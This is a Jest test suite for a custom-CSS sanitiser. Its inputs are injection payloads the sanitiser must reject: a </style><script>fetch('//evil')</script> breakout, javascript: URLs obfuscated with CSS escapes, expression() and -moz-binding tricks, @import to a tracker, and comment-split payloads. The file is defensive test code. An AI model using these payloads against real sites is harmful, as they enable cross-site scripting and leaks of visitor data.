import { MAX_CUSTOM_CSS_LENGTH, sanitiseCustomCss } from '../src/theme/css-sanitiser';

const rejected = (css: string) => sanitiseCustomCss(css).rejections.length > 0;
const patterns = (css: string) => sanitiseCustomCss(css).rejections.map((r) => r.pattern);

describe('custom CSS sanitiser', () => {
  it('accepts ordinary stylesheet content', () => {
    const css = `
      .hero { background: #fafafa; padding: 48px 0; }
      .hero h1 { font-size: 2.5rem; letter-spacing: -0.02em; }
      @media (max-width: 600px) { .hero { padding: 24px 0; } }
    `;
    const result = sanitiseCustomCss(css);
    expect(result.rejections).toEqual([]);
    expect(result.css).toContain('.hero');
  });

  it('treats empty input as empty, not as an error', () => {
    expect(sanitiseCustomCss('')).toEqual({ css: '', rejections: [] });
    expect(sanitiseCustomCss(null)).toEqual({ css: '', rejections: [] });
    expect(sanitiseCustomCss('   ')).toEqual({ css: '', rejections: [] });
  });

  /**
   * The attack that matters most: closing the style block turns everything
   * after it into HTML running on the store's own origin.
   */
  it('refuses a </style> breakout', () => {
    expect(rejected('body{}</style><script>fetch("//evil")</script>')).toBe(true);
    expect(patterns('a{}</style>')).toContain('<style> or </style>');
  });

  it('refuses a breakout written with whitespace inside the tag', () => {
    expect(rejected('a{}< / style ><script>x()</script>')).toBe(true);
  });

  it('refuses script tags', () => {
    expect(rejected('a{}<script>alert(1)</script>')).toBe(true);
  });

  it('refuses HTML comment markers', () => {
    expect(rejected('a{} <!-- b{} -->')).toBe(true);
  });

  it('refuses javascript: URLs', () => {
    expect(rejected('a { background: url(javascript:alert(1)); }')).toBe(true);
  });

  /**
   * CSS hex escapes mean `\6a avascript:` reaches the browser as `javascript:`.
   * A naive string search misses it; decoding first does not.
   */
  it('refuses javascript: obfuscated with CSS escapes', () => {
    expect(rejected('a { background: url(\\6a avascript:alert(1)); }')).toBe(true);
    expect(rejected('a { background: url(\\00006Aavascript:alert(1)); }')).toBe(true);
  });

  it('refuses expression(), -moz-binding and behavior:', () => {
    expect(rejected('a { width: expression(alert(1)); }')).toBe(true);
    expect(rejected('a { -moz-binding: url(//evil/x.xml#e); }')).toBe(true);
    expect(rejected('a { behavior: url(evil.htc); }')).toBe(true);
  });

  /** An @import phones home on every page view, leaking visitor data. */
  it('refuses @import', () => {
    expect(rejected('@import url("//tracker.example/x.css");')).toBe(true);
    expect(patterns('@import "x.css";')).toContain('@import');
  });

  it('allows http, https and relative image URLs', () => {
    expect(rejected('a { background: url(https://cdn.example/bg.png); }')).toBe(false);
    expect(rejected('a { background: url(http://cdn.example/bg.png); }')).toBe(false);
    expect(rejected('a { background: url(/assets/bg.png); }')).toBe(false);
    expect(rejected('a { background: url("../img/bg.png"); }')).toBe(false);
  });

  it('allows data: image URLs but not other data: payloads', () => {
    expect(rejected('a { background: url(data:image/png;base64,iVBORw0KGgo=); }')).toBe(false);
    expect(rejected('a { background: url(data:text/html;base64,PHNjcmlwdD4=); }')).toBe(true);
  });

  it('strips comments even from CSS it accepts', () => {
    const result = sanitiseCustomCss('/* a note */ .x { color: red; }');
    expect(result.rejections).toEqual([]);
    expect(result.css).not.toContain('a note');
    expect(result.css).toContain('.x');
  });

  /** Comments are the usual place to hide half a payload from a skim-reader. */
  it('sees through a payload split by a comment', () => {
    expect(rejected('a{}</sty/* hidden */le><script>x()</script>')).toBe(true);
  });

  it('refuses CSS beyond the length cap', () => {
    const huge = `.a { color: red; }`.repeat(MAX_CUSTOM_CSS_LENGTH);
    expect(patterns(huge)).toContain('length');
  });

  it('reports every distinct problem, not just the first', () => {
    const result = sanitiseCustomCss('@import "x"; a { behavior: url(e.htc); }');
    expect(result.rejections.length).toBeGreaterThanOrEqual(2);
  });
});
